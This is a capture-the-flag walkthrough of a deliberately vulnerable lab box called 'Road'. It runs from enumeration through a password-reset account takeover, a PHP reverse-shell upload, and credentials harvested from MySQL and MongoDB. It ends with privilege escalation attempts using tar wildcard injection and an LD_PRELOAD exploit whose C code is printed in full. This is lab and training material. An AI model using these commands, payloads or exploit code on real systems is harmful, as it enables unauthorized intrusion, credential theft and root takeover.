# Road - Medium

* Add ```road.thm``` to ```/etc/hosts``` and start scan - ```nmap -T4 -p- -A -Pn -v road.thm```:

  * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
  * 80/tcp - http - Apache httpd 2.4.41 ((Ubuntu))

* We can start web enumeration:

  ```sh
  gobuster dir -u http://road.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # directory scan

  gobuster dir -u http://road.thm/assets -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # scan the folders recursively

  gobuster dir -u http://road.thm/v2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25

  gobuster dir -u http://road.thm/v2/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25

  ffuf -c -u "http://road.thm" -H "Host: FUZZ.road.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fw 2975 -s
  # subdomain enum

  gobuster vhost -u http://road.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
  # vhost enum
  ```

* The webpage is for 'Sky Couriers'; the source code does not show much, so we can interact with the 2 forms we have at /index.html - the 'Track Order' form and the 'Contact Us' form

* The forms do not have any functionality, but we get another page at /v2/admin/login.html which seems to be for the Admin page

* Also, directory enumeration gives us the following pages:

  * /assets
  * /career.html
  * /v2 (this leads to /v2/admin/login.html)
  * /phpMyAdmin

* Checking the other folders recursively, we get pages at /v2/lostpassword.php, /v2/admin/index.php, /v2/admin/register.html, /v2/admin/reg.html

* Navigating to /v2/lostpassword.php shows 'Internal Server Error!', and /v2/admin/reg.html does not give us anything

* Since we do not have any known creds, and using default creds does not help, we can register an account at /v2/admin/register.html, and try to login using those creds

* After logging in, we get access to a dashboard - the only points of interaction with input fields include the AWB search at /v2/admin/track_orders.php, profile view at /v2/profile.php, and reset user at /v2/ResetUser.php

* When we try to interact with the AWB search with a test input, we are led to '/v2/admin/track_orders.php?awb=test', which says the service is not fixed; we can check other endpoints

* For /profile.php, amongst other text fields, we have an image upload field as well for profile image - but currently only <admin@sky.thm> has access to that feature according to the given note.

* Now, for the reset user functionality at /v2/ResetUser.php, we can test if we are able to change the username from our email to admin email. If we intercept a request after submitting 'password' as the new password, and we change the email value to <admin@sky.thm>, and forward this modified request, we get a successful message and led to login page again, where the email <admin@sky.thm> with password 'password' works

* Now, as admin user, if we navigate to /profile.php, we can see the profile image functionality is allowed for us

* We can try to upload reverse shell here by bypassing any upload restrictions - on a test upload, we can see '.php' files can be uploaded, but it does not reflect when we click on the profile image in the top right corner of webpage

* In the source code for /v2/profile.php, we can see a comment which mentions the path '/v2/profileimages/' - this could include the uploaded files

* Navigating to this page shows 'directory listing is disabled', but we can try using the same file name as the uploaded one to attempt a reverse shell:

  ```sh
  nc -nvlp 4444
  # setup listener

  # after uploading the PHP reverse shell, we can try accessing it
  curl http://road.thm/v2/profileimages/revshell.php

  # this works and we get reverse shell

  id
  # www-data

  # we can upgrade our shell to a stable one
  python3 -c 'import pty;pty.spawn("/bin/bash")'

  export TERM=xterm

  # Ctrl+Z
  stty raw -echo; fg
  # now press Enter key twice

  # start initial enumeration

  ls -la /home
  # we have a user here

  ls -la /home/webdeveloper
  # we can get the user flag

  # we cannot read the other files here
  # we can enumerate the web directory

  ls -la /var/www/html
  # we can enumerate all the directories & files here
  ```

* In the PHP file '/var/www/html/v2/lostpassword.php', we get the password "ThisIsSecurePassword!" used for connecting to MySQL DB

* We can try using these creds to connect to MySQL service:

  ```sh
  mysql -u root -p
  # the above password works

  show databases;

  use SKY;

  show tables;

  select * from Users;
  # shows web login info, not useful
  ```

* Since MySQL does not have anything useful, we can check for any other services to be enumerated:

  ```sh
  ss -ltnp
  # check internal services for anything to be enumerated
  # we have port 27017 open
  ```

* 27017 is for MongoDB - we can try connecting to this:

  ```sh
  mongo --port 27017
  # we get connected

  show dbs;

  # we have 'backup' DB here

  use backup;

  show collections;

  # check the 'user' collection
  db.user.find().pretty();
  # this prints out some data
  # includes name and password "webdeveloper:BahamasChapp123!@#"
  ```

* Using these creds, we can try logging in via SSH:

  ```sh
  ssh webdeveloper@road.thm
  # the above password works

  sudo -l
  ```

* ```sudo -l``` shows that we can run ```/usr/bin/sky_backup_utility``` as root without password - we can check this binary further:

  ```sh
  ls -la /usr/bin/sky_backup_utility
  # we cannot write to this file

  file /usr/bin/sky_backup_utility

  strings /usr/bin/sky_backup_utility
  ```

* From ```strings``` for the binary, we get a line ```tar -czvf /root/.backup/sky-backup.tar.gz /var/www/html/*```; as wildcard character is used for ```tar```, we can exploit this using [tar wildcard injection methods](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/):

  ```sh
  # navigate to target directory
  cd /var/www/html

  # now we can follow the exploit
  # and give 'webdeveloper' user root privs
  echo 'echo "webdeveloper ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > runme.sh
  # this says permission denied, seems 'webdeveloper' user does not have write privileges in this directory

  # navigate back to the reverse-shell for user 'www-data'
  # this user can write to the web directory
  echo 'echo "webdeveloper ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > runme.sh
  # this works

  # in the same directory, we need to inject the code for this to work
  echo "" > "--checkpoint-action=exec=sh runme.sh"

  echo "" > --checkpoint=1

  # now, go back to the SSH session of 'webdeveloper'
  # we can run the script now as we have 'sudo' privileges for this
  sudo /usr/bin/sky_backup_utility
  # this does not work
  ```

* From the ```sudo -l``` output that we had checked earlier, we can also see ```LD_PRELOAD``` is set, we can try to exploit this:

  ```sh
  cd

  vim shell.c
  # add the exploit code

  gcc -fPIC -shared shell.c -o shell.so -nostartfiles
  # compile exploit

  sudo LD_PRELOAD=/home/webdeveloper/shell.so /usr/bin/sky_backup_utility
  # run it with the binary
  # this works and we get root shell
  ```

  ```c
  #include <stdio.h>
  #include <sys/types.h>
  #include <stdlib.h>

  void _init() {
      unsetenv("LD_PRELOAD");
      setgid(0);
      setuid(0);
      system("/bin/bash");
  }
  ```
